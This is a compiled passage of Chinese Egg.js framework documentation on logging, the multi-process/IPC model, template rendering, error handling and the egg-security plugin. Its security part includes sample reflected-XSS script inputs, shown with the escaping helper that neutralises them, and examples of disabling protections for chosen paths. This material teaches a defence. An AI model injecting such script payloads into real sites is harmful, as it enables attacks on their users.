	dir: '/path/to/your/custom/log/dir',
};
日志分类
框架内置了几种日志，分别在不同的场景下使用：

appLogger ${appInfo.name}-web.log，例如 example-app-web.log，应用相关日志，供应用开发者使用的日志。我们在绝大数情况下都在使用它。
coreLogger egg-web.log 框架内核、插件日志。
errorLogger common-error.log 实际一般不会直接使用它，任何 logger 的 .error() 调用输出的日志都会重定向到这里，重点通过查看此日志定位异常。
agentLogger egg-agent.log agent 进程日志，框架和使用到 agent 进程执行任务的插件会打印一些日志到这里。
如果想自定义以上日志文件名称，可以在 config 文件中覆盖默认值：

// config/config.${env}.js
module.exports = appInfo => {
	return {
		logger: {
			appLogName: `${appInfo.name}-web.log`,
			coreLogName: 'egg-web.log',
			agentLogName: 'egg-agent.log',
			errorLogName: 'common-error.log',
		},
	};
};

如何打印日志
 Context Logger
如果我们在处理请求时需要打印日志，这时候使用 Context Logger，用于记录 Web 行为相关的日志。

每行日志会自动记录上当前请求的一些基本信息， 如 [$userId/$ip/$traceId/${cost}ms $method $url]。

ctx.logger.debug('debug info');
ctx.logger.info('some request data: %j', ctx.request.body);
ctx.logger.warn('WARNNING!!!!');

// 错误日志记录，直接会将错误日志完整堆栈信息记录下来，并且输出到 errorLog 中
// // 为了保证异常可追踪，必须保证所有抛出的异常都是 Error 类型，因为只有 Error 类型才会带上堆栈信息，定位到问题。
ctx.logger.error(new Error('whoops'));
对于框架开发者和插件开发者会使用到的 Context Logger 还有 ctx.coreLogger。

例如

ctx.coreLogger.info('info');
App Logger
如果我们想做一些应用级别的日志记录，如记录启动阶段的一些数据信息，可以通过 App Logger 来完成。

// app.js
module.exports = app => {
	app.logger.debug('debug info');
	app.logger.info('启动耗时 %d ms', Date.now() - start);
	app.logger.warn('warning!');

	app.logger.error(someErrorObj);
};
对于框架和插件开发者会使用到的 App Logger 还有 app.coreLogger。

// app.js
module.exports = app => {
	app.coreLogger.info('启动耗时 %d ms', Date.now() - start);
};
Agent Logger
在开发框架和插件时有时会需要在 Agent 进程运行代码，这时使用 agent.coreLogger。

// agent.js
module.exports = agent => {
	agent.logger.debug('debug info');
	agent.logger.info('启动耗时 %d ms', Date.now() - start);
	agent.logger.warn('warning!');

	agent.logger.error(someErrorObj);
};
如需详细了解 Agent 进程，请参考多进程模型。

日志文件编码
默认编码为 utf-8，可通过如下方式覆盖：

// config/config.${env}.js
exports.logger = {
	encoding: 'gbk',
};

## 日志级别
日志分为 NONE，DEBUG，INFO，WARN 和 ERROR 5 个级别。

日志打印到文件中的同时，为了方便开发，也会同时打印到终端中。

文件日志级别
默认只会输出 INFO 及以上（WARN 和 ERROR）的日志到文件中。

可通过如下方式配置输出到文件日志的级别：

打印所有级别日志到文件中：

// config/config.${env}.js
exports.logger = {
	level: 'DEBUG',
};
关闭所有打印到文件的日志：

// config/config.${env}.js
exports.logger = {
	level: 'NONE',
};
终端日志级别
默认只会输出 INFO 及以上（WARN 和 ERROR）的日志到终端中。

logger.consoleLevel: 输出到终端日志的级别，默认为 INFO
可通过如下方式配置输出到终端日志的级别：

打印所有级别日志到终端：

// config/config.${env}.js
exports.logger = {
	consoleLevel: 'DEBUG',
};
关闭所有打印到终端的日志：

// config/config.${env}.js
exports.logger = {
	consoleLevel: 'NONE',
};
自定义日志
增加自定义日志
一般应用无需配置自定义日志，因为日志打太多或太分散都会导致关注度分散，反而难以管理和难以排查发现问题。

如果实在有需求可以如下配置：

// config/config.${env}.js
const path = require('path');

module.exports = appInfo => {
	return {
		customLogger: {
			xxLogger: {
				file: path.join(appInfo.root, 'logs/xx.log'),
			},
		},
	};
};
可通过 app.getLogger('xxLogger') / ctx.getLogger('xxLogger') 获取，最终的打印结果和 coreLogger 类似。

高级自定义日志
日志默认是打印到日志文件中，当本地开发时同时会打印到终端。 但是，有时候我们会有需求把日志打印到其他媒介上，这时候我们就需要自定义日志的 transport。

Transport 是一种传输通道，一个 logger 可包含多个传输通道。比如默认的 logger 就有 fileTransport 和 consoleTransport 两个通道， 分别负责打印到文件和终端。

举个例子，我们不仅需要把错误日志打印到 common-error.log，还需要上报给第三方服务。

首先我们定义一个日志的 transport，代表第三方日志服务。

const util = require('util');
const Transport = require('egg-logger').Transport;

class RemoteErrorTransport extends Transport {

	// 定义 log 方法，在此方法中把日志上报给远端服务
	log(level, args) {
		let log;
		if (args[0] instanceof Error) {
			const err = args[0];
			log = util.format('%s: %s\n%s\npid: %s\n', err.name, err.message, err.stack, process.pid);
		} else {
			log = util.format(...args);
		}

		this.options.app.curl('http://url/to/remote/error/log/service/logs', {
			data: log,
			method: 'POST',
		}).catch(console.error);
	}
}

// app.js 中给 errorLogger 添加 transport，这样每条日志就会同时打印到这个 transport 了
app.getLogger('errorLogger').set('remote', new RemoteErrorTransport({ level: 'ERROR', app  }));
上面的例子比较简单，实际情况中我们需要考虑性能，很可能采取先打印到内存，再定时上传的策略，以提高性能。

日志切割
企业级日志一个最常见的需求之一是对日志进行自动切割，以方便管理。框架对日志切割的支持由 egg-logrotator 插件提供。

按天切割
这是框架的默认日志切割方式，在每日 00:00 按照 .log.YYYY-MM-DD 文件名进行切割。

以 appLog 为例，当前写入的日志为 example-app-web.log，当凌晨 00:00 时，会对日志进行切割，把过去一天的日志按 example-app-web.log.YYYY-MM-DD 的形式切割为单独的文件。

按照文件大小切割
我们也可以按照文件大小进行切割。例如，当文件超过 2G 时进行切割。

例如，我们需要把 egg-web.log 按照大小进行切割：

// config/config.${env}.js
const path = require('path');

module.exports = appInfo => {
	return {
		logrotator: {
			filesRotateBySize: [
				path.join(appInfo.root, 'logs', appInfo.name, 'egg-web.log'),
			],
			maxFileSize: 2 * 1024 * 1024,
		},
	};
};
添加到 filesRotateBySize 的日志文件不再按天进行切割。

按照小时切割
我们也可以选择按照小时进行切割，这和默认的按天切割非常类似，只是时间缩短到每小时。

例如，我们需要把 common-error.log 按照小时进行切割：

// config/config.${env}.js
const path = require('path');

module.exports = appInfo => {
	return {
		logrotator: {
			filesRotateByHour: [
				path.join(appInfo.root, 'logs', appInfo.name, 'common-error.log'),
			],
		},
	};
};
添加到 filesRotateByHour 的日志文件不再被按天进行切割。

性能
通常 Web 访问是高频访问，每次打印日志都写磁盘会造成频繁磁盘 IO，为了提高性能，我们采用的文件日志写入策略是：

日志同步写入内存，异步每隔一段时间(默认 1 秒)刷盘

更多详细请参考 egg-logger 和 egg-logrotator。

--------------------------------------------------
Egg的多进程模型
Cluster 是什么呢？
简单的说，

在服务器上同时启动多个进程。
每个进程里都跑的是同一份源代码（好比把以前一个进程的工作分给多个进程去做）。
更神奇的是，这些进程可以同时监听一个端口（具体原理推荐阅读 @DavidCai1993 这篇 Cluster 实现原理）。
其中：

负责启动其他进程的叫做 Master 进程，他好比是个『包工头』，不做具体的工作，只负责启动其他进程。
其他被启动的叫 Worker 进程，顾名思义就是干活的『工人』。它们接收请求，对外提供服务。
Worker 进程的数量一般根据服务器的 CPU 核数来定，这样就可以完美利用多核资源。

const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
	Fork workers.
		for (let i = 0; i < numCPUs; i++) {
			cluster.fork();
		}

	cluster.on('exit', function(worker, code, signal) {
		console.log('worker ' + worker.process.pid + ' died');
	});
} else {
	// Workers can share any TCP connection
	// In this case it is an HTTP server
	http.createServer(function(req, res) {
		res.writeHead(200);
		res.end("hello world\n");
	}).listen(8000);
}

gent 机制
说到这里，Node.js 多进程方案貌似已经成型，这也是我们早期线上使用的方案。但后来我们发现有些工作其实不需要每个 Worker 都去做，如果都做，一来是浪费资源，更重要的是可能会导致多进程间资源访问冲突。举个例子：生产环境的日志文件我们一般会按照日期进行归档，在单进程模型下这再简单不过了：

每天凌晨 0 点，将当前日志文件按照日期进行重命名
销毁以前的文件句柄，并创建新的日志文件继续写入
试想如果现在是 4 个进程来做同样的事情，是不是就乱套了。所以，对于这一类后台运行的逻辑，我们希望将它们放到一个单独的进程上去执行，这个进程就叫 Agent Worker，简称 Agent。Agent 好比是 Master 给其他 Worker 请的一个『秘书』，它不对外提供服务，只给 App Worker 打工，专门处理一些公共事务。现在我们的多进程模型就变成下面这个样子了

                +--------+          +-------+
                  | Master |<-------->| Agent |
                  +--------+          +-------+
                  ^   ^    ^
                 /    |     \
             /      |       \
           /        |         \
         v          v          v
+----------+   +----------+   +----------+
  | Worker 1 |   | Worker 2 |   | Worker 3 |
  +----------+   +----------+   +----------+
  那我们框架的启动时序如下：

+---------+           +---------+          +---------+
  |  Master |           |  Agent  |          |  Worker |
  +---------+           +----+----+          +----+----+
       |      fork agent     |                    |
       +-------------------->|                    |
       |      agent ready    |                    |
       |<--------------------+                    |
       |                     |     fork worker    |
       +----------------------------------------->|
       |     worker ready    |                    |
       |<-----------------------------------------+
       |      Egg ready      |                    |
       +-------------------->|                    |
       |      Egg ready      |                    |
       +----------------------------------------->|
  Master 启动后先 fork Agent 进程
Agent 初始化成功后，通过 IPC 通道通知 Master
Master 再 fork 多个 App Worker
App Worker 初始化成功，通知 Master
所有的进程初始化成功后，Master 通知 Agent 和 Worker 应用启动成功
另外，关于 Agent Worker 还有几点需要注意的是：

由于 App Worker 依赖于 Agent，所以必须等 Agent 初始化完成后才能 fork App Worker
Agent 虽然是 App Worker 的『小秘』，但是业务相关的工作不应该放到 Agent 上去做，不然把她累垮了就不好了
由于 Agent 的特殊定位，我们应该保证它相对稳定。当它发生未捕获异常，框架不会像 App Worker 一样让他退出重启，而是记录异常日志、报警等待人工处理
Agent 和普通 App Worker 挂载的 API 不完全一样，如何识别差异可查看框架文档


## Agent 的用法
你可以在应用或插件根目录下的 agent.js 中实现你自己的逻辑（和启动自定义 用法类似，只是入口参数是 agent 对象）

// agent.js
module.exports = agent => {
	// 在这里写你的初始化逻辑

	// 也可以通过 messenger 对象发送消息给 App Worker
	// 但需要等待 App Worker 启动成功后才能发送，不然很可能丢失
	agent.messenger.on('egg-ready', () => {
		const data = { ...  };
		agent.messenger.sendToApp('xxx_action', data);
	});
};
// app.js
module.exports = app => {
	app.messenger.on('xxx_action', data => {
		// ...
	});
};
这个例子中，agent.js 的代码会执行在 agent 进程上，app.js 的代码会执行在 Worker 进程上，他们通过框架封装的 messenger 对象进行进程间通讯（IPC），后面的章节会对框架的 IPC 做详细的讲解。

Master VS Agent VS Worker
当一个应用启动时，会同时启动这三类进程。

类型  进程数量  作用  稳定性  是否运行业务代码
Master  1 进程管理，进程间消息转发  非常高  否
Agent 1 后台运行工作（长连接客户端）  高  少量
Worker  一般设置为 CPU 核数 执行业务代码  一般  是

 Master
在这个模型下，Master 进程承担了进程管理的工作（类似 pm2），不运行任何业务代码，我们只需要运行起一个 Master 进程它就会帮我们搞定所有的 Worker、Agent 进程的初始化以及重启等工作了。
Master 进程的稳定性是极高的，线上运行时我们只需要通过 egg-scripts 后台运行通过 egg.startCluster 启动的 Master 进程就可以了，不再需要使用 pm2 等进程守护模块。
$ egg-scripts start --daemon

 Agent
在大部分情况下，我们在写业务代码的时候完全不用考虑 Agent 进程的存在，但是当我们遇到一些场景，只想让代码运行在一个进程上的时候，Agent 进程就到了发挥作用的时候了。
由于 Agent 只有一个，而且会负责许多维持连接的脏活累活，因此它不能轻易挂掉和重启，所以 Agent 进程在监听到未捕获异常时不会退出，但是会打印出错误日志，我们需要对日志中的未捕获异常提高警惕。

 Worker
Worker 进程负责处理真正的用户请求和定时任务的处理。而 Egg 的定时任务也提供了只让一个 Worker 进程运行的能力，所以能够通过定时任务解决的问题就不要放到 Agent 上执行。
Worker 运行的是业务代码，相对会比 Agent 和 Master 进程上运行的代码复杂度更高，稳定性也低一点，当 Worker 进程异常退出时，Master 进程会重启一个 Worker 进程。

'use strict';
const cluster = require('cluster');

if (cluster.isMaster) {
	const worker = cluster.fork();
	worker.send('hi there');
	worker.on('message', msg => {
		console.log(`msg: ${msg} from worker#${worker.id}`);
	});
} else if (cluster.isWorker) {
	process.on('message', (msg) => {
		process.send(msg);
	});

}
细心的你可能已经发现 cluster 的 IPC 通道只存在于 Master 和 Worker/Agent 之间，Worker 与 Agent 进程互相间是没有的。那么 Worker 之间想通讯该怎么办呢？是的，通过 Master 来转发。

广播消息： agent => all workers
                  +--------+          +-------+
                    | Master |<---------| Agent |
                    +--------+          +-------+
                   /    |     \
                /     |      \
               /      |       \
              /       |        \
             v        v         v
  +----------+   +----------+   +----------+
    | Worker 1 |   | Worker 2 |   | Worker 3 |
    +----------+   +----------+   +----------+

  指定接收方： one worker => another worker
                  +--------+          +-------+
                    | Master |----------| Agent |
                    +--------+          +-------+
                   ^    |
       send to    /     |
      worker 2   /      |
                /       |
               /        v
  +----------+   +----------+   +----------+
    | Worker 1 |   | Worker 2 |   | Worker 3 |
    +----------+   +----------+   +----------+
  为了方便调用，我们封装了一个 messenger 对象挂在 app / agent 实例上，提供一系列友好的 API。


发送
app.messenger.broadcast(action, data)：发送给所有的 agent / app 进程（包括自己）
app.messenger.sendToApp(action, data): 发送给所有的 app 进程
在 app 上调用该方法会发送给自己和其他的 app 进程
在 agent 上调用该方法会发送给所有的 app 进程
app.messenger.sendToAgent(action, data): 发送给 agent 进程
在 app 上调用该方法会发送给 agent 进程
在 agent 上调用该方法会发送给 agent 自己
agent.messenger.sendRandom(action, data):
app 上没有该方法（现在 Egg 的实现是等同于 sentToAgent）
agent 会随机发送消息给一个 app 进程（由 master 来控制发送给谁）
app.messenger.sendTo(pid, action, data): 发送给指定进程
app.js
module.exports = app => {
	// 注意，只有在 egg-ready 事件拿到之后才能发送消息
	app.messenger.once('egg-ready', () => {
		app.messenger.sendToAgent('agent-event', { foo: 'bar'  });
		app.messenger.sendToApp('app-event', { foo: 'bar'  });
	});
}
上面所有 app.messenger 上的方法都可以在 agent.messenger 上使用。

 egg-ready
上面的示例中提到，需要等 egg-ready 消息之后才能发送消息。只有在 Master 确认所有的 Agent 进程和 Worker 进程都已经成功启动（并 ready）之后，才会通过 messenger 发送 egg-ready 消息给所有的 Agent 和 Worker，告知一切准备就绪，IPC 通道可以开始使用了。

 接收
在 messenger 上监听对应的 action 事件，就可以收到其他进程发送来的信息了。

app.messenger.on(action, data => {
    // process data
});
app.messenger.once(action, data => {
    // process data
});
agent 上的 messenger 接收消息的用法和 app 上一致。

 IPC 实战
我们通过一个简单的例子来感受一下在框架的多进程模型下如何使用 IPC 解决实际问题。

 需求
我们有一个接口需要从远程数据源中读取一些数据，对外部提供 API，但是这个数据源的数据很少变化，因此我们希望将数据缓存到内存中以提升服务能力，降低 RT。此时就需要有一个更新内存缓存的机制。

定时从远程数据源获取数据，更新内存缓存，为了降低对数据源压力，更新的间隔时间会设置的比较长。
远程数据源提供一个检查是否有数据更新的接口，我们的服务可以更频繁的调用检查接口，当有数据更新时才去重新拉取数据。
远程数据源通过消息中间件推送数据更新的消息，我们的服务监听消息来更新数据。
在实际项目中，我们可以采用方案一用于兜底，结合方案三或者方案二的一种用于提升数据更新的实时性。而在这个示例中，我们会通过 IPC + 定时任务来同时实现这三种缓存更新方案。

 实现
我们将所有的与远程数据源交互的逻辑封装在一个 Service 中，并提供 get 方法给 Controller 调用。

// app/service/source.js
let memoryCache = {};

class SourceService extends Service {
	get(key) {
		return memoryCache[key];
	}

	async checkUpdate() {
		// check if remote data source has changed
		const updated = await mockCheck();
		this.ctx.logger.info('check update response %s', updated);
		return updated;
	}

	async update() {
		// update memory cache from remote
		memoryCache = await mockFetch();
		this.ctx.logger.info('update memory cache from remote: %j', memoryCache);
	}
}
编写定时任务，实现方案一，每 10 分钟定时从远程数据源获取数据更新缓存做兜底。

// app/schedule/force_refresh.js
exports.schedule = {
	interval: '10m',
	type: 'all', // run in all workers
};

exports.task = async ctx => {
	await ctx.service.source.update();
	ctx.app.lastUpdateBy = 'force';
};
再编写一个定时任务来实现方案二的检查逻辑，每 10s 让一个 worker 调用检查接口，当发现数据有变化时，通过 messenger 提供的方法通知所有的 Worker。

// app/schedule/pull_refresh.js
exports.schedule = {
	interval: '10s',
	type: 'worker', // only run in one worker
};

exports.task = async ctx => {
	const needRefresh = await ctx.service.source.checkUpdate();
	if (!needRefresh) return;

	// notify all workers to update memory cache from `file`
	ctx.app.messenger.sendToApp('refresh', 'pull');
};
在启动自定义文件中监听 refresh 事件，并更新数据，所有的 Worker 进程都能收到这个消息，并触发更新，此时我们的方案二也已经大功告成了。

// app.js
module.exports = app => {
	app.messenger.on('refresh', by => {
		app.logger.info('start update by %s', by);
		// create an anonymous context to access service
		const ctx = app.createAnonymousContext();
		ctx.runInBackground(async () => {
			await ctx.service.source.update();
			app.lastUpdateBy = by;
		});
	});
};
现在我们来看看如何实现第三个方案。我们需要有一个消息中间件的客户端，它会和服务端保持长连接，这一类的长连接维持比较适合在 Agent 进程上做，可以有效降低连接数，减少两端的消耗。所以我们在 Agent 进程上来开启消息监听。

// agent.js

const Subscriber = require('./lib/subscriber');

module.exports = agent => {
	const subscriber = new Subscriber();
	// listen changed event, broadcast to all workers
	subscriber.on('changed', () => agent.messenger.sendToApp('refresh', 'push'));
};
通过合理使用 Agent 进程、定时任务和 IPC，我们可以轻松搞定类似的需求并降低对数据源的压力。具体的示例代码可以查看 examples/ipc。

更复杂的场景
上面的例子中，我们在 Agent 进程上运行了一个 subscriber，来监听消息中间件的消息，如果 Worker 进程也需要监听一些消息怎么办？如何通过 Agent 进程建立连接再转发给 Worker 进程呢？这些问题可以在多进程研发模式增强中找到答案。

--------------------------------------------------
View 模板渲染
绝大多数情况，我们都需要读取数据后渲染模板，然后呈现给用户。故我们需要引入对应的模板引擎。

框架内置 egg-view 作为模板解决方案，并支持多模板渲染，每个模板引擎都以插件的方式引入，但保持渲染的 API 一致。如果想更深入的了解，可以查看模板插件开发。

以下以官方支持的 View 插件 egg-view-nunjucks 为例

 引入 view 插件
$ npm i egg-view-nunjucks --save
 启用插件
config/plugin.js
exports.nunjucks = {
	enable: true,
	package: 'egg-view-nunjucks',
};
配置插件
egg-view 提供了 config.view 通用配置

root {String}
模板文件的根目录，为绝对路径，默认为 ${baseDir}/app/view。支持配置多个目录，以 , 分割，会从多个目录查找文件。

如下示例演示了如何配置多个 view 目录：

// config/config.default.js
const path = require('path');
module.exports = appInfo => {
	const config = {};
	config.view = {
		root: [
			path.join(appInfo.baseDir, 'app/view'),
			path.join(appInfo.baseDir, 'path/to/another'),
		].join(',')
	};
	return config;
};
cache {Boolean}
模板路径缓存，默认开启。框架会根据 root 配置的目录依次查找，如果匹配则会缓存文件路径，下次渲染相同路径时不会重新查找。

mapping 和 defaultViewEngine
每个模板在注册时都会指定一个模板名（viewEngineName），在使用时需要根据后缀来匹配模板名，比如指定 .nj 后缀的文件使用 Nunjucks 进行渲染。

module.exports = {
	view: {
		mapping: {
			'.nj': 'nunjucks',
		},
	},
};
调用 render 渲染文件时，会根据上述配置的后缀名去寻找对应的模板引擎。

await ctx.render('home.nj');
必须配置文件后缀和模板引擎的映射，否则无法找到对应的模板引擎，但是可以使用 defaultViewEngine 做全局配置。

// config/config.default.js
module.exports = {
	view: {
		defaultViewEngine: 'nunjucks',
	},
};
如果根据文件后缀没有找到对应的模板引擎，会使用默认的模板引擎进行渲染。对于只使用一种模板引擎的应用，建议配置此选项。

defaultExtension
一般在调用 render 时的第一个参数需要包含文件后缀，如果配置了 defaultExtension 可以省略后缀。

// config/config.default.js
module.exports = {
	view: {
		defaultExtension: '.nj',
	},
};

// render app/view/home.nj
await ctx.render('home');
渲染页面
框架在 Context 上提供了 3 个接口，返回值均为 Promise:

render(name, locals) 渲染模板文件, 并赋值给 ctx.body
renderView(name, locals) 渲染模板文件, 仅返回不赋值
renderString(tpl, locals) 渲染模板字符串, 仅返回不赋值
// {app_root}/app/controller/home.js
class HomeController extends Controller {
	async index() {
		const data = { name: 'egg'  };

		// render a template, path relate to `app/view`
		await ctx.render('home/index.tpl', data);

		// or manually set render result to ctx.body
		ctx.body = await ctx.renderView('path/to/file.tpl', data);

		// or render string directly
		ctx.body = await ctx.renderString('hi, {{ name  }}', data, {
			viewEngine: 'nunjucks',
		});
	}
}
当使用 renderString 时需要指定模板引擎，如果已经定义 defaultViewEngine 这里可以省略。

Locals
在渲染页面的过程中，我们通常需要一个变量来收集需要传递给模板的变量，在框架里面，我们提供了 app.locals 和 ctx.locals。

app.locals 为全局的，一般在 app.js 里面配置全局变量。
ctx.locals 为单次请求的，会合并 app.locals。
可以直接赋值对象，框架在对应的 setter 里面会自动 merge。
// `app.locals` 会合并到 `ctx.locals
ctx.app.locals = { a: 1  };
ctx.locals.b = 2;
console.log(ctx.locals); // { a: 1, b: 2  }

// 一次请求过程中，仅会在第一次使用 `ctx.locals` 时把 `app.locals` 合并进去。
ctx.app.locals = { a: 2  };
console.log(ctx.locals); // 上面已经合并过一次，故输出还是 { a: 1, b: 2  }

// 也可以直接赋值整个对象，不用担心会覆盖前面的值，我们通过 setter 做了自动合并。
ctx.locals.c = 3;
ctx.locals = { d: 4  };
console.log(ctx.locals); // { a: 1, b: 2, c: 3, d: 4  }
但在实际业务开发中，controller 中一般不会直接使用这 2 个对象，直接使用 ctx.render(name, data) 即可：

框架会自动把 data 合并到 ctx.locals。
框架会自动注入 ctx, request, helper 方便使用。
ctx.app.locals = { appName: 'showcase'  };
const data = { user: 'egg'  };

// will auto merge `data` to `ctx.locals`, output: egg - showcase
await ctx.renderString('{{ name  }} - {{ appName  }}', data);

// helper, ctx, request will auto inject
await ctx.renderString('{{ name  }} - {{ helper.lowercaseFirst(ctx.app.config.baseDir)  }}', data);
注意：

ctx.locals 有缓存，只在第一次访问 ctx.locals 时合并 app.locals。
原 Koa 中的 ctx.state，由于容易产生歧义，在框架中被覆盖为 locals，即 ctx.state 和 ctx.locals 等价，我们建议使用后者。
Helper
在模板中可以直接使用 helper 上注册的方法，具体可以参见扩展。

// app/extend/helper.js
exports.lowercaseFirst = str => str[0].toLowerCase() + str.substring(1);

// app/controller/home.js
await ctx.renderString('{{ helper.lowercaseFirst(name)  }}', data);
Security
框架内置的 egg-security 插件，为我们提供了常见的安全辅助函数，包括 helper.shtml / surl / sjs 等等等，强烈建议阅读下安全。

--------------------------------------------------
异常处理
 异常捕获
得益于框架支持的异步编程模型，错误完全可以用 try catch 来捕获。在编写应用代码时，所有地方都可以直接用 try catch 来捕获异常。

app/service/test.js
try {
	const res = await this.ctx.curl('http://eggjs.com/api/echo', { dataType: 'json'  });
	if (res.status !== 200) throw new Error('response status is not 200');
	return res.data;
} catch (err) {
	this.logger.error(err);
	return {};
}
按照正常代码写法，所有的异常都可以用这个方式进行捕获并处理，但是一定要注意一些特殊的写法可能带来的问题。打一个不太正式的比方，我们的代码全部都在一个异步调用链上，所有的异步操作都通过 await 串接起来了，但是只要有一个地方跳出了异步调用链，异常就捕获不到了。

// app/controller/home.js
class HomeController extends Controller {
	async buy () {
		const request = {};
		const config = await ctx.service.trade.buy(request);
		// 下单后需要进行一次核对，且不阻塞当前请求
		setImmediate(() => {
			ctx.service.trade.check(request).catch(err => ctx.logger.error(err));
		});
	}
}
在这个场景中，如果 service.trade.check 方法中代码有问题，导致执行时抛出了异常，尽管框架会在最外层通过 try catch 统一捕获错误，但是由于 setImmediate 中的代码『跳出』了异步链，它里面的错误就无法被捕捉到了。因此在编写类似代码的时候一定要注意。

当然，框架也考虑到了这类场景，提供了 ctx.runInBackground(scope) 辅助方法，通过它又包装了一个异步链，所有在这个 scope 里面的错误都会统一捕获。

class HomeController extends Controller {
	async buy () {
		const request = {};
		const config = await ctx.service.trade.buy(request);
		// 下单后需要进行一次核对，且不阻塞当前请求
		ctx.runInBackground(async () => {
			// 这里面的异常都会统统被 Backgroud 捕获掉，并打印错误日志
			await ctx.service.trade.check(request);
		});
	}
}
为了保证异常可追踪，必须保证所有抛出的异常都是 Error 类型，因为只有 Error 类型才会带上堆栈信息，定位到问题。

框架层统一异常处理
框架通过 onerror 插件提供了统一的错误处理机制。对一个请求的所有处理方法（Middleware、Controller、Service）中抛出的任何异常都会被它捕获，并自动根据请求想要获取的类型返回不同类型的错误（基于 Content Negotiation）。

请求需求的格式  环境  errorPageUrl 是否配置 返回内容
HTML & TEXT local & unittest  - onerror 自带的错误页面，展示详细的错误信息
HTML & TEXT 其他  是  重定向到 errorPageUrl
HTML & TEXT 其他  否  onerror 自带的没有错误信息的简单错误页（不推荐）
JSON & JSONP  local & unittest  - JSON 对象或对应的 JSONP 格式响应，带详细的错误信息
JSON & JSONP  其他  - JSON 对象或对应的 JSONP 格式响应，不带详细的错误信息
errorPageUrl
onerror 插件的配置中支持 errorPageUrl 属性，当配置了 errorPageUrl 时，一旦用户请求线上应用的 HTML 页面异常，就会重定向到这个地址。

在 config/config.default.js 中

// config/config.default.js
module.exports = {
	onerror: {
		// 线上页面发生异常时，重定向到这个页面上
		errorPageUrl: '/50x.html',
	},
};
自定义统一异常处理
尽管框架提供了默认的统一异常处理机制，但是应用开发中经常需要对异常时的响应做自定义，特别是在做一些接口开发的时候。框架自带的 onerror 插件支持自定义配置错误处理方法，可以覆盖默认的错误处理方法。

// config/config.default.js
module.exports = {
	onerror: {
		all(err, ctx) {
			// 在此处定义针对所有响应类型的错误处理方法
			// 注意，定义了 config.all 之后，其他错误处理方法不会再生效
			ctx.body = 'error';
			ctx.status = 500;
		},
		html(err, ctx) {
			// html hander
			ctx.body = '<h3>error</h3>';
			ctx.status = 500;
		},
		json(err, ctx) {
			// json hander
			ctx.body = { message: 'error'  };
			ctx.status = 500;
		},
		jsonp(err, ctx) {
			// 一般来说，不需要特殊针对 jsonp 进行错误定义，jsonp 的错误处理会自动调用 json 错误处理，并包装成 jsonp 的响应格式
		},
	},
};
404
框架并不会将服务端返回的 404 状态当做异常来处理，但是框架提供了当响应为 404 且没有返回 body 时的默认响应。

当请求被框架判定为需要 JSON 格式的响应时，会返回一段 JSON：

{ "message": "Not Found"  }
当请求被框架判定为需要 HTML 格式的响应时，会返回一段 HTML：

	<h1>404 Not Found</h1>
	框架支持通过配置，将默认的 HTML 请求的 404 响应重定向到指定的页面。

// config/config.default.js
module.exports = {
	notfound: {
		pageUrl: '/404.html',
	},
};
自定义 404 响应
在一些场景下，我们需要自定义服务器 404 时的响应，和自定义异常处理一样，我们也只需要加入一个中间件即可对 404 做统一处理：

// app/middleware/notfound_handler.js
module.exports = () => {
	return async function notFoundHandler(ctx, next) {
		await next();
		if (ctx.status === 404 && !ctx.body) {
			if (ctx.acceptJSON) {
				ctx.body = { error: 'Not Found'  };
			} else {
				ctx.body = '<h1>Page Not Found</h1>';
			}
		}
	};
};
在配置中引入中间件：

// config/config.default.js
module.exports = {
	middleware: [ 'notfoundHandler'  ],
};

--------------------------------------------------
安全
 Web 安全概念
Web 应用中存在很多安全风险，这些风险会被黑客利用，轻则篡改网页内容，重则窃取网站内部数据，更为严重的则是在网页中植入恶意代码，使得用户受到侵害。常见的安全漏洞如下：

XSS 攻击：对 Web 页面注入脚本，使用 JavaScript 窃取用户信息，诱导用户操作。
CSRF 攻击：伪造用户请求向网站发起恶意请求。
钓鱼攻击：利用网站的跳转链接或者图片制造钓鱼陷阱。
HTTP参数污染：利用对参数格式验证的不完善，对服务器进行参数注入攻击。
远程代码执行：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。
而框架本身针对 Web 端常见的安全风险内置了丰富的解决方案：

利用 extend 机制扩展了 Helper API, 提供了各种模板过滤函数，防止钓鱼或 XSS 攻击。
常见 Web 安全头的支持。
CSRF 的防御方案。
灵活的安全配置，可以匹配不同的请求 url 。
可定制的白名单，用于安全跳转和 url 过滤。
各种模板相关的工具函数做预处理。
在框架中内置了安全插件 egg-security， 提供了默认的安全实践。

 开启与关闭配置
注意：除非清楚的确认后果，否则不建议擅自关闭安全插件提供的功能。

框架的安全插件是默认开启的，如果我们想关闭其中一些安全防范，直接设置该项的 enable 属性为 false 即可。例如关闭 xframe 防范：

exports.security = {
  xframe: {
    enable: false,
  },
};
 match 和 ignore
match 和 ignore 使用方法和格式与中间件通用配置一致。

如果只想开启针对某一路径，则配置 match 选项，例如只针对 /example 开启 CSP：

exports.security = {
  csp: {
    match: '/example',
    policy: {
      //...
    },
  },
};
如果需要针对某一路径忽略某安全选项，则配置 ignore 选项，例如针对 /example 关闭 xframe，以便合作商户能够嵌入我们的页面：

exports.security = {
  csp: {
    ignore: '/example',
    xframe: {
      //...
    },
  },
};
如果要针对内部 ip 关闭部分安全防范：

exports.security = {
  csrf: {
    // 判断是否需要 ignore 的方法，请求上下文 context 作为第一个参数
    ignore: ctx => isInnerIp(ctx.ip),
  },
}
下面我们会针对具体的场景，来讲解如何使用框架提供的安全方案进行 Web 安全防范。

 安全威胁XSS的防范
XSS（cross-site scripting跨域脚本攻击）攻击是最常见的 Web 攻击，其重点是『跨域』和『客户端执行』。

XSS 攻击一般分为两类：

Reflected XSS（反射型的 XSS 攻击）
Stored XSS（存储型的 XSS 攻击）
 Reflected XSS
反射型的 XSS 攻击，主要是由于服务端接收到客户端的不安全输入，在客户端触发执行从而发起 Web 攻击。比如：

在某购物网站搜索物品，搜索结果会显示搜索的关键词。搜索关键词填入<script>alert('handsome boy')</script>, 点击搜索。页面没有对关键词进行过滤，这段代码就会直接在页面上执行，弹出 alert。

 防范方式
框架提供了 helper.escape() 方法对字符串进行 XSS 过滤。

const str = '><script>alert("abc") </script><';
console.log(ctx.helper.escape(str));
// => &gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;
当网站需要直接输出用户输入的结果时，请务必使用 helper.escape() 包裹起来，如在 egg-view-nunjucks 里面就覆盖掉了内置的 escape。

另外一种情况，网站输出的内容会提供给 JavaScript 来使用。这个时候需要使用 helper.sjs() 来进行过滤。

